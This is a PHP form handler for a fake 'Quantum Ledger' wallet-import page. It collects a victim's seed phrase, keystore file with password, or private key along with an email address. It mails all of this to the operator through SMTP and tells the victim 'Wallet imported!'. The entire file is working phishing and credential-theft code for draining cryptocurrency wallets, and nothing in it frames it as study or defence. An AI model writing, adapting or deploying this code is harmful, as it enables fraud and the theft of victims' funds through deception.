<?php
// api/process.php – EMAIL-ONLY, NO DB, NO VENDOR DRAMA
ob_start();
header('Content-Type: application/json; charset=utf-8');
error_reporting(E_ALL);
ini_set('log_errors', 1);
ini_set('error_log', __DIR__.'/../error.log');
session_start(['cookie_secure'=>true,'cookie_httponly'=>true,'use_strict_mode'=>true]);

// 1. GET = CSRF token
if ($_SERVER['REQUEST_METHOD']==='GET') {
    if (empty($_SESSION['csrf'])) $_SESSION['csrf'] = bin2hex(random_bytes(32));
    echo json_encode(['csrf_token'=>$_SESSION['csrf']]); 
    exit;
}

// 2. POST – minimal deps
if (!class_exists('PHPMailer\PHPMailer\PHPMailer')) {
    require __DIR__.'/../vendor/phpmailer/phpmailer/src/PHPMailer.php';
    require __DIR__.'/../vendor/phpmailer/phpmailer/src/SMTP.php';
    require __DIR__.'/../vendor/phpmailer/phpmailer/src/Exception.php';
}
use PHPMailer\PHPMailer\PHPMailer;

// 3. CSRF + quick validate
if (!hash_equals($_SESSION['csrf'], $_POST['csrf_token']??'')) {
    echo json_encode(['error'=>'CSRF']); exit;
}
$wallet = trim($_POST['pwallet']??$_POST['kwallet']??$_POST['prwallet']??'');
$email  = trim($_POST['pemail'] ??$_POST['kemail'] ??$_POST['premail'] ??'');
$data   = $_POST['phrase'] ?? ($_POST['keystore']."\nPass:".$_POST['password']) ?? $_POST['private']??'';

if (!$wallet || !filter_var($email,FILTER_VALIDATE_EMAIL) || !$data) {
    echo json_encode(['error'=>'Invalid']); exit;
}

// 4. EMAIL (hard-code if .env missing)
$mail = new PHPMailer(true);
try {
    $mail->isSMTP();
    $mail->Host       = $_ENV['SMTP_HOST']       ?? 'smtp.gmail.com';
    $mail->SMTPAuth   = true;
    $mail->Username   = $_ENV['SMTP_USER']       ?? 'you@gmail.com';
    $mail->Password   = $_ENV['SMTP_PASS']       ?? 'your-app-password';
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $mail->Port       = 587;

    $mail->setFrom($mail->Username, 'Quantum Ledger');
    $mail->addAddress($_ENV['TO_EMAIL'] ?? $mail->Username);
    $mail->Subject = "New $wallet";
    $mail->Body    = "Wallet: $wallet\nEmail: $email\n\n$data\n\n— ".date('Y-m-d H:i:s');

    $mail->send();
    echo json_encode(['success'=>'Wallet imported!']);
} catch (Exception $e) {
    error_log("Mail: ".$mail->ErrorInfo);
    echo json_encode(['error'=>'Try again']);
}
?>